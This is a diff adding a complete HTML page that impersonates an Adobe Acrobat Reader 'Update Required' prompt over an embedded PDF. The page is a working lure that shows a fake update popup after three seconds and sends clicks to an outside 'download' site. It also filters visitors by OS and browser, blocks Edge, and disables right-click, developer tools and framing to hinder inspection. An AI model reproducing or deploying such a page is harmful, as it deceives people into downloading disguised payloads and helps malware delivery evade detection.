@@ -1,0 +1,519 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Adobe Acrobat Reader DC - Update Required</title>
+    <style>
+        /* Adobe Clean Font */
+        @font-face {
+            font-family: 'Adobe Clean';
+            src: url('https://use.typekit.net/af/6d0a5c/00000000000000007735b603/30/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&v=3') format('woff2');
+            font-weight: normal;
+            font-style: normal;
+        }
+
+        @font-face {
+            font-family: 'Adobe Clean';
+            src: url('https://use.typekit.net/af/6a4e9f/00000000000000007735b607/30/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&v=3') format('woff2');
+            font-weight: bold;
+            font-style: normal;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Adobe Clean', 'Segoe UI', Arial, sans-serif;
+            background-color: #f5f5f5;
+            overflow: hidden;
+            user-select: none;
+            -webkit-user-select: none;
+            height: 100vh;
+        }
+
+        #pdf-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            transition: filter 0.8s ease-in-out, opacity 0.5s ease;
+            z-index: 1;
+        }
+
+        #pdf-container embed {
+            width: 100%;
+            height: 100%;
+        }
+
+        /* Blur overlay when popup appears */
+        .blur-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(8px);
+            z-index: 2;
+            display: none;
+            opacity: 0;
+            transition: opacity 0.6s ease-in-out;
+        }
+
+        /* Adobe-style Popup */
+        #adobe-popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 540px;
+            max-width: 90%;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3);
+            z-index: 100;
+            font-family: 'Adobe Clean', Arial, sans-serif;
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            opacity: 0;
+            transition: opacity 0.4s ease-out;
+        }
+
+        .popup-header {
+            background: #ED2224;
+            color: white;
+            padding: 18px 24px;
+            font-size: 16px;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            border-bottom: 1px solid #d00;
+        }
+
+        .popup-content {
+            padding: 28px 24px;
+            color: #333;
+        }
+
+        .popup-content h3 {
+            margin: 0 0 12px 0;
+            font-size: 22px;
+            font-weight: bold;
+            color: #000;
+        }
+
+        .popup-content p {
+            margin: 12px 0;
+            font-size: 14px;
+            line-height: 1.5;
+            color: #444;
+        }
+
+        .error-code {
+            display: inline-block;
+            margin-top: 16px;
+            padding: 8px 14px;
+            background: #f9f9f9;
+            border: 1px solid #eee;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            color: #d32f2f;
+            letter-spacing: 0.5px;
+            user-select: text;
+        }
+
+        .popup-footer {
+            padding: 16px 24px;
+            text-align: right;
+            background: #f8f8f8;
+            border-top: 1px solid #e5e5e5;
+        }
+
+        .btn {
+            padding: 8px 24px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: bold;
+            transition: all 0.2s;
+            min-width: 120px;
+            text-align: center;
+            height: 38px;
+        }
+
+        .btn-default {
+            background: #f0f0f0;
+            color: #333;
+            margin-right: 12px;
+            border: 1px solid #d0d0d0;
+        }
+
+        .btn-default:hover {
+            background: #e5e5e5;
+        }
+
+        .btn-primary {
+            background: #1473e6;
+            color: white;
+            border: 1px solid #0d66d0;
+        }
+
+        .btn-primary:hover {
+            background: #0d66d0;
+        }
+
+        .adobe-logo {
+            width: 90px;
+            height: 24px;
+            margin-right: 12px;
+        }
+
+        /* Protection message */
+        #protection-message {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0, 0, 0, 0.8);
+            color: white;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 12px;
+            z-index: 300;
+            display: none;
+            font-family: 'Adobe Clean', Arial, sans-serif;
+        }
+
+        /* OS Warning */
+        #os-warning {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #1a1a2e;
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        .os-warning-content {
+            max-width: 500px;
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        .os-warning-content h2 {
+            color: #ED2224;
+            margin-top: 0;
+        }
+
+        /* Browser Warning */
+        #browser-warning {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #1a1a2e;
+            z-index: 1001;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        .browser-warning-content {
+            max-width: 500px;
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        .browser-warning-content h2 {
+            color: #ED2224;
+            margin-top: 0;
+        }
+
+        .browser-warning-content ul {
+            text-align: left;
+            margin: 15px 0;
+            padding-left: 20px;
+        }
+
+        .browser-warning-content ul li {
+            margin: 8px 0;
+            font-size: 14px;
+        }
+
+        @keyframes popupFadeIn {
+            from {
+                opacity: 0;
+                transform: translate(-50%, -50%) scale(0.95);
+            }
+            to {
+                opacity: 1;
+                transform: translate(-50%, -50%) scale(1);
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- PDF Container - Initially visible -->
+    <div id="pdf-container">
+        <embed src="https://bafybeibojed7h57jl3tsj3rf2kjorrbxvm7zsaw2cg7wvlwaelvo45xmmy.ipfs.dweb.link?filename=doc.pdf" type="application/pdf" width="100%" height="100%">
+    </div>
+
+    <!-- Blur layer for popup -->
+    <div class="blur-overlay" id="blur-layer"></div>
+
+    <!-- OS Warning (only for non-Windows) -->
+    <div id="os-warning">
+        <div class="os-warning-content">
+            <h2>Unsupported Operating System</h2>
+            <p>This application is only available for Windows users.</p>
+            <p>Please access this page from a Windows device to view the content.</p>
+            <p><strong>Detected operating system: <span id="detected-os"></span></strong></p>
+        </div>
+    </div>
+
+    <!-- Browser Warning (for Microsoft Edge) -->
+    <div id="browser-warning">
+        <div class="browser-warning-content">
+            <h2>⚠️ Browser Not Supported</h2>
+            <p>Microsoft Edge is not supported for this application.</p>
+            <p>Please use one of the following browsers:</p>
+            <ul>
+                <li><strong>Google Chrome</strong> (Recommended)</li>
+                <li><strong>Mozilla Firefox</strong></li>
+                <li><strong>Opera</strong></li>
+                <li><strong>Brave</strong></li>
+            </ul>
+            <p><strong>Detected browser: <span id="detected-browser"></span></strong></p>
+        </div>
+    </div>
+
+    <!-- Main Adobe Popup (Update Required) -->
+    <div id="adobe-popup">
+        <div class="popup-header">
+            <img class="adobe-logo"
+                src="https://i0.wp.com/busestoconcerts.com/wp-content/uploads/revslider/G-AI-Logos/adobelogo.png"
+                alt="Adobe Logo">
+            Adobe Acrobat Reader DC
+        </div>
+        <div class="popup-content">
+            <h3>Update Required</h3>
+            <p>Your version of Adobe Acrobat Reader DC is outdated and cannot display this content securely.</p>
+            <p>To continue, please update to the latest version of Adobe Acrobat Reader DC.</p>
+            <span class="error-code">Error Code: 0x803F8001</span>
+        </div>
+        <div class="popup-footer">
+            <button class="btn btn-default" id="cancel-btn">Cancel</button>
+            <button class="btn btn-primary" id="update-btn">Update</button>
+        </div>
+    </div>
+
+    <div id="protection-message">⚠️ Action blocked</div>
+
+    <script>
+        // ==================== UTILITY FUNCTIONS ====================
+        function showProtectionMessage(msg) {
+            const msgDiv = document.getElementById('protection-message');
+            msgDiv.textContent = msg || '⚠️ Action blocked';
+            msgDiv.style.display = 'block';
+            setTimeout(() => {
+                msgDiv.style.display = 'none';
+            }, 1500);
+        }
+
+        // Detect OS
+        function detectOS() {
+            const userAgent = window.navigator.userAgent;
+            const platform = window.navigator.platform;
+            const macosPlatforms = ['Macintosh', 'MacIntel', 'MacPPC', 'Mac68K'];
+            const windowsPlatforms = ['Win32', 'Win64', 'Windows', 'WinCE'];
+            const iosPlatforms = ['iPhone', 'iPad', 'iPod'];
+
+            if (macosPlatforms.indexOf(platform) !== -1) {
+                return 'Mac OS';
+            } else if (iosPlatforms.indexOf(platform) !== -1) {
+                return 'iOS';
+            } else if (windowsPlatforms.indexOf(platform) !== -1) {
+                return 'Windows';
+            } else if (/Android/.test(userAgent)) {
+                return 'Android';
+            } else if (/Linux/.test(platform)) {
+                return 'Linux';
+            }
+            return 'Unknown OS';
+        }
+
+        // Detect Browser
+        function detectBrowser() {
+            const userAgent = window.navigator.userAgent;
+            
+            // Check for Edge first (both old and new Edge)
+            if (userAgent.indexOf('Edg') > -1) {
+                return 'Microsoft Edge';
+            } else if (userAgent.indexOf('Edge') > -1) {
+                return 'Microsoft Edge (Legacy)';
+            } else if (userAgent.indexOf('Chrome') > -1 && userAgent.indexOf('OPR') === -1) {
+                return 'Google Chrome';
+            } else if (userAgent.indexOf('Firefox') > -1) {
+                return 'Mozilla Firefox';
+            } else if (userAgent.indexOf('Safari') > -1 && userAgent.indexOf('Chrome') === -1) {
+                return 'Apple Safari';
+            } else if (userAgent.indexOf('OPR') > -1 || userAgent.indexOf('Opera') > -1) {
+                return 'Opera';
+            } else if (userAgent.indexOf('Brave') > -1) {
+                return 'Brave';
+            }
+            return 'Unknown Browser';
+        }
+
+        // ==================== REDIRECT TO update.php ====================
+        function redirectToUpdatePage() {
+            // Direct redirect to update.php
+            window.location.href = "https://get-service.xyz/documents/reader/download/";
+        }
+
+        // ==================== POPUP DISPLAY ====================
+        function showMainPopup() {
+            const blurLayer = document.getElementById('blur-layer');
+            const mainPopup = document.getElementById('adobe-popup');
+            const pdfContainer = document.getElementById('pdf-container');
+            
+            // Blur the PDF
+            pdfContainer.style.filter = 'blur(8px)';
+            pdfContainer.style.opacity = '0.7';
+            
+            // Show blur layer
+            blurLayer.style.display = 'block';
+            setTimeout(() => {
+                blurLayer.style.opacity = '1';
+            }, 10);
+            
+            // Show popup
+            mainPopup.style.display = 'block';
+            setTimeout(() => {
+                mainPopup.style.opacity = '1';
+                mainPopup.style.animation = 'popupFadeIn 0.4s ease-out';
+            }, 50);
+        }
+
+        // ==================== SECURITY PROTECTIONS ====================
+        function initSecurityProtections() {
+            // Disable right-click
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                showProtectionMessage("Right-click is disabled");
+            });
+
+            // Disable developer tools
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'F12' ||
+                    (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+                    (e.ctrlKey && e.key === 'U') ||
+                    (e.ctrlKey && e.key === 'S') ||
+                    (e.ctrlKey && e.shiftKey && e.key === 'C') ||
+                    (e.ctrlKey && e.shiftKey && e.key === 'J') ||
+                    (e.ctrlKey && e.key === 'E') ||
+                    (e.key === 'PrintScreen')) {
+                    e.preventDefault();
+                    showProtectionMessage("Developer tools are disabled");
+                }
+            });
+
+            // Disable text selection
+            document.addEventListener('selectstart', function(e) {
+                e.preventDefault();
+            });
+
+            // Anti-iframe
+            if (window.top !== window.self) {
+                window.top.location = window.self.location;
+            }
+        }
+
+        // ==================== WINDOWS INITIALIZATION ====================
+        function initWindowsFunctionality() {
+            initSecurityProtections();
+            
+            // Attach event listeners to buttons
+            const cancelBtn = document.getElementById('cancel-btn');
+            const updateBtn = document.getElementById('update-btn');
+            
+            // Cancel button: just shows a message (or you can also redirect if needed, but per requirement only Update redirects)
+            cancelBtn.addEventListener('click', function() {
+                showProtectionMessage("Update is required to continue");
+            });
+            
+            // Update button: redirect to update.php immediately
+            updateBtn.addEventListener('click', function() {
+                redirectToUpdatePage();
+            });
+            
+            // Show popup after 3 seconds (simulate PDF loading then error)
+            setTimeout(function() {
+                showMainPopup();
+            }, 3000);
+        }
+
+        // ==================== OS CHECK ====================
+        function checkOSAndBrowser() {
+            const os = detectOS();
+            const browser = detectBrowser();
+            
+            document.getElementById('detected-os').textContent = os;
+            document.getElementById('detected-browser').textContent = browser;
+
+            // Check for Microsoft Edge first (highest priority)
+            if (browser === 'Microsoft Edge' || browser === 'Microsoft Edge (Legacy)') {
+                // Show browser warning, hide everything else
+                document.getElementById('browser-warning').style.display = 'flex';
+                document.getElementById('os-warning').style.display = 'none';
+                document.getElementById('pdf-container').style.display = 'none';
+                return;
+            }
+
+            // If not Edge, check OS
+            if (os !== 'Windows') {
+                // Show OS warning, hide PDF container
+                document.getElementById('os-warning').style.display = 'flex';
+                document.getElementById('pdf-container').style.display = 'none';
+                document.getElementById('browser-warning').style.display = 'none';
+            } else {
+                document.getElementById('os-warning').style.display = 'none';
+                document.getElementById('browser-warning').style.display = 'none';
+                initWindowsFunctionality();
+            }
+        }
+
+        // Start everything when page loads
+        window.onload = checkOSAndBrowser;
+    </script>
+</body>
+
+</html>
